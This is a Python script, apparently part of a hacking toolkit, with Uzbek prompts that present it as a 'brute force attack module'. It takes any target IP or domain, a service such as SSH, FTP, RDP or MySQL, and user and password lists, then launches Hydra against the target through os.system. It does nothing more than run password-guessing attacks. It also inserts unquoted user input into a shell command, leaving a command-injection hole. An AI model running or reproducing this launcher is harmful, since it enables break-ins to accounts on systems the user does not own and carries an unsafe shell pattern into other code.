#!/usr/bin/python

import os
import re

def banner():
    print("""
        ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
        ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
        ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
        ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
        ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
        ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝                                 
    """)

def validate_target(target):
    ip_pattern = r"^(?:\d{1,3}\.){3}\d{1,3}$"
    domain_pattern = r"^(?=.{1,253}$)((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,}$"
    return re.match(ip_pattern, target) or re.match(domain_pattern, target)

def run_hydra():
    os.system("clear")
    banner()
    print("🔐 HYDRA Brute Force Hujum Moduli")

    # Maqsadli IP yoki domenni olish
    while True:
        target = input("\n🎯 Maqsadli IP yoki domenni kiriting: ").strip()
        if validate_target(target):
            break
        print("❌ Noto'g'ri format! To‘g‘ri IP yoki domen kiriting.")

    # Xizmat tanlash
    services = {
        "1": "ssh",
        "2": "ftp",
        "3": "telnet",
        "4": "http-get",
        "5": "mysql",
        "6": "rdp"
    }

    print("\n🔧 Xizmatni tanlang:")
    for key, val in services.items():
        print(f"{key}. {val.upper()}")

    while True:
        service_choice = input("\nXizmat raqamini kiriting: ").strip()
        if service_choice in services:
            service = services[service_choice]
            break
        print("❌ Noto'g'ri tanlov. Qayta urinib ko‘ring.")

    # Foydalanuvchi nomi yoki fayl
    while True:
        user_input = input("👤 Foydalanuvchi faylini (-L) yoki nomini (-l) kiriting: ").strip()
        if os.path.isfile(user_input):
            user_param = f"-L {user_input}"
            break
        elif len(user_input) > 0:
            user_param = f"-l {user_input}"
            break
        else:
            print("❌ Noto'g'ri kirish. Iltimos, foydalanuvchi fayli yoki nomini kiriting.")

    # Parollar faylini so'rash
    while True:
        password_file = input("🔑 Parollar faylini kiriting (masalan, passwords.txt): ").strip()
        if os.path.isfile(password_file):
            pass_param = f"-P {password_file}"
            break
        else:
            print("❌ Fayl topilmadi. To‘g‘ri fayl nomini kiriting.")

    # Hydra buyrug‘ini tuzish
    command = f"hydra {user_param} {pass_param} {target} {service}"
    print(f"\n🚀 Hydra ishga tushirilmoqda:\n👉 {command}\n")
    os.system(command)

    # Davom ettirish
    again = input("\n🔁 Yana sinab ko‘rasizmi? (yes/no): ").strip().lower()
    if again == "yes":
        run_hydra()
    else:
        print("\n⬅️ Asosiy menyuga qaytilmoqda...\n")
        try:
            from main import main
            main()
        except ImportError:
            print("⚠️ main.py topilmadi yoki import qilinmadi.")

